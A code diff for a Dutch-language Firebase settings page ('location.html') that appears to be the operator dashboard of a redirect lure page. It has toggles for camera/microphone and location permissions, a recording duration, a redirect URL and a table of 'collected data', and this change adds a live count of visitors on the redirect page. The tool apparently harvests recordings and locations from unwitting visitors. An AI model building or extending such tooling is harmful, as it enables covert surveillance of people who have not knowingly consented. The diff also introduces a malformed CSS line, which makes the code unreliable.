@@ -1,4 +1,4 @@
-<!-- location.html (Complete with Corrections) -->
+<!-- location.html (with Live Viewer Count, Customizable Heading, and Standaardbericht Removal) -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,7 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instellingen</title>
     <style>
-        /* (All your existing styles, *NO CHANGES NEEDED HERE*) */
+       /* (All your existing styles, *NO CHANGES NEEDED HERE*) */
          body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
@@ -25,7 +25,7 @@
             padding: 30px;
             width: 100%;
             max-width: 700px;
-             transition: background-color 0.5s, box-shadow 0.5s;
+             transition: background-color 0.5s, box-shadow: 0.5s;
         }
         h2 {
             color: #333;
@@ -389,6 +389,19 @@
             margin-top: 5px;
             display: none;
         }
+
+        /* NEW: Style for the viewer count */
+        #viewer-count-container {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f0f8ff; /* Light blue background */
+            border: 1px solid #add8e6; /* Light blue border */
+            border-radius: 4px;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #007bff; /* Blue text */
+        }
     </style>
 
      <!-- Firebase SDK (Firestore) -->
@@ -437,10 +450,7 @@
         <p id="notification-permission-message">Accepteer notificatie toestemming om notificaties te ontvangen.</p>
 
         <!-- Global Input Fields -->
-        <div class="input-row">
-            <label for="message-text">Standaardbericht (optioneel):</label>
-            <input type="text" id="message-text" class="input-field" placeholder="Voer een bericht in">
-        </div>
+        <!-- REMOVED: Standaardbericht input -->
 
         <div class="input-row">
             <label for="redirect-url">Doorverwijs-URL *</label>
@@ -488,6 +498,10 @@
           <!-- Data Section -->
         <div class="data-section">
             <h3 id="data-table-title" class="editable-title" data-original-title="Verzamelde Gegevens:">Verzamelde Gegevens:</h3>
+             <!-- NEW: Viewer Count Display -->
+            <div id="viewer-count-container">
+                Aantal gebruikers op doorverwijs pagina: <span id="viewer-count">0</span>
+            </div>
             <table class="data-table">
                 <tbody id="data-list">
                     <!-- User data rows will be added here -->
@@ -571,7 +585,7 @@ const micCamPermissionToggle = document.getElementById('mic-cam-permission');
 const locationPermissionToggle = document.getElementById('location-permission');
 const notificationPermissionToggle = document.getElementById('notification-permission');
 const dataList = document.getElementById('data-list');
-const messageText = document.getElementById('message-text');
+const messageText = document.getElementById('message-text');  // Keep this, even though the input is removed
 const redirectUrl = document.getElementById('redirect-url');
 const redirectSeconds = document.getElementById('redirect-seconds');
 const recordSeconds = document.getElementById('record-seconds');
@@ -585,6 +599,8 @@ const backgroundImageURLInput = document.getElementById('background-image-url');
 const iconImageURLInput = document.getElementById('icon-image-url');
 const customTextInput = document.getElementById('custom-text-modal');
 const notificationPermissionMessage = document.getElementById('notification-permission-message');
+// NEW: Viewer count element
+const viewerCountSpan = document.getElementById('viewer-count');
 
 let currentUserId = "user1"; //  Initial user ID
 
@@ -640,18 +656,18 @@ async function getNextUserId() {
 }
 
 // Save/Update Custom Theme (Modified to accept a 'saveNow' flag)
+// ALSO MODIFIED: Uses customText for redirectHeading if available.
 async function saveCustomTheme(saveNow = true) { // Default to saving
     const themeName = themeNameInput.value.trim();
-    const customText = customTextInput.value.trim();
-    const backgroundImageUrl = backgroundImageURLInput.value; // Get URL from hidden input
-    const iconImageUrl = iconImageURLInput.value;          // Get URL from hidden input
+    const customText = customTextInput.value.trim();  // Use this for heading
+    const backgroundImageUrl = backgroundImageURLInput.value;
+    const iconImageUrl = iconImageURLInput.value;
 
     if (!themeName) {
         displayError("Thema naam mag niet leeg zijn.");
-        return null; // Return null on error
+        return null;
     }
 
-    // Validate URLs (basic check)
     if (backgroundImageUrl && !isValidHttpUrl(backgroundImageUrl)) {
         displayError("Ongeldige URL voor achtergrondafbeelding.");
         return null;
@@ -661,11 +677,15 @@ async function saveCustomTheme(saveNow = true) { // Default to saving
         return null;
     }
 
+
+     // Use customText as redirectHeading if it exists, otherwise, keep it as customText
     const themeData = {
         backgroundImageUrl: backgroundImageUrl,
         iconImageUrl: iconImageUrl,
-        customText: customText
+        redirectHeading: customText ? customText : undefined,  // Use customText for heading
+        customText: customText ? undefined : customText,       // Only keep if not used for heading
     };
+
 
     if (saveNow) {
         try {
@@ -680,16 +700,16 @@ async function saveCustomTheme(saveNow = true) { // Default to saving
                 displaySuccess(`Thema "${themeName}" succesvol opgeslagen!`);
             }
 
-            resetThemeModal(); // Clear and hide modal
-            loadCustomThemes(); // Reload theme list
+            resetThemeModal();
+            loadCustomThemes();
 
         } catch (error) {
             console.error("Error saving/updating custom theme:", error);
             displayError(`Fout bij opslaan/bijwerken thema: ${error.message}`);
-            return null; // Return null on error
+            return null;
         }
     }
-    return themeData; // Return the theme data (useful for immediate preview)
+    return themeData;
 }
 
 // Load Custom Themes into Selectors
@@ -727,7 +747,7 @@ async function loadThemeForEditing(themeName) {
         themeNameInput.value = themeName;
         backgroundImageURLInput.value = themeData.backgroundImageUrl || '';
         iconImageURLInput.value = themeData.iconImageUrl || '';
-        customTextInput.value = themeData.customText || '';
+        customTextInput.value = themeData.customText || themeData.redirectHeading ||''; // Load heading/text
 
         // Set preview images and confirmation text
         setPreviewImage(backgroundImagePreview, backgroundImageURLInput.value, backgroundUploadConfirmation);
@@ -742,8 +762,6 @@ async function loadThemeForEditing(themeName) {
 }
 
 // Apply Theme (to settings page)
-//  Only applies BASIC styles to THIS page.  Theming of the redirect
-//  page happens in redirect.html.
 function applyTheme(themeName) {
     const theme = themes[themeName] || themes.default;
     document.body.style.backgroundColor = theme.bodyBackgroundColor;
@@ -793,10 +811,10 @@ async function loadSettingsAndData(userId) {
             micCamPermissionToggle.checked = settingsData.micCamPermission || false;
             locationPermissionToggle.checked = settingsData.locationPermission || false;
             notificationPermissionToggle.checked = settingsData.notificationPermission || false;
-            messageText.value = settingsData.messageText || '';
+            // messageText.value = settingsData.messageText || ''; // REMOVED: No longer needed
             redirectUrl.value = settingsData.redirectUrl || '';
             redirectSeconds.value = settingsData.redirectSeconds || '0';
-                        recordSeconds.value = settingsData.recordSeconds || '0';
+            recordSeconds.value = settingsData.recordSeconds || '0';
             themeSelector.value = settingsData.theme || 'default'; // Set the value *first*
             applyTheme(themeSelector.value);   // *Then* apply the theme (only to location.html)
 
@@ -807,7 +825,7 @@ async function loadSettingsAndData(userId) {
             micCamPermissionToggle.checked = false;
             locationPermissionToggle.checked = false;
             notificationPermissionToggle.checked = false;
-            messageText.value = '';
+            // messageText.value = ''; // REMOVED: No longer needed
             redirectUrl.value = '';
             redirectSeconds.value = '0';
             recordSeconds.value = '0';
@@ -835,7 +853,7 @@ async function saveSettings() {
             micCamPermission: micCamPermissionToggle.checked,
             locationPermission: locationPermissionToggle.checked,
             notificationPermission: notificationPermissionToggle.checked,
-            messageText: messageText.value,
+            // messageText: messageText.value, // REMOVED: No longer needed
             redirectUrl: redirectUrl.value,
             redirectSeconds: redirectSeconds.value,
             recordSeconds: recordSeconds.value,
@@ -845,8 +863,8 @@ async function saveSettings() {
 
         await settingsRef.set(settings);
         displaySuccess("Instellingen succesvol opgeslagen!");
-        currentUserId = nextUserId; // Update current user *before* awaiting load
-        await loadSettingsAndData(currentUserId); // Reload settings and data.  CRITICAL: Await this.
+        currentUserId = nextUserId;
+        await loadSettingsAndData(currentUserId);
 
 
     } catch (error) {
@@ -1226,10 +1244,26 @@ createThemeButton.addEventListener('click', handleCreateThemeButtonClick);
 closeModalButton.addEventListener('click', handleCloseModalButtonClick);
 cancelCustomThemeButton.addEventListener('click', handleCancelCustomThemeButtonClick);
 saveCustomThemeButton.addEventListener('click', handleSaveCustomThemeButtonClick); // Call the handler function
-
-// ... (Other event listeners - NO CHANGE NEEDED) ...
 uploadBackgroundButton.addEventListener('click', handleUploadBackgroundButtonClick);
 uploadIconButton.addEventListener('click', handleUploadIconButtonClick);
+
+// NEW: Live Viewer Count Listener
+function setupViewerCountListener() {
+    const viewerCountRef = db.collection('metrics').doc('redirectViewers');
+
+    viewerCountRef.onSnapshot((doc) => {
+        if (doc.exists) {
+            const count = doc.data().count || 0; // Default to 0 if not present
+            viewerCountSpan.textContent = count;
+        } else {
+            viewerCountSpan.textContent = '0'; // Default if doc doesn't exist
+            console.log("No viewer count document found.");
+        }
+    }, (error) => {
+        console.error("Error getting viewer count:", error);
+        viewerCountSpan.textContent = 'Error'; // Indicate an error
+    });
+}
 
 // --- Initial Setup ---
 loadSettingsAndData(currentUserId).catch(error => {
@@ -1237,7 +1271,10 @@ loadSettingsAndData(currentUserId).catch(error => {
     displayError("Fout bij initialiseren van de pagina.");
 });
 updateNotificationPermissionStatus();
+// NEW: Start listening for viewer count updates
+setupViewerCountListener();
+
 
 </script>
 </body>
-</html>    
+</html>
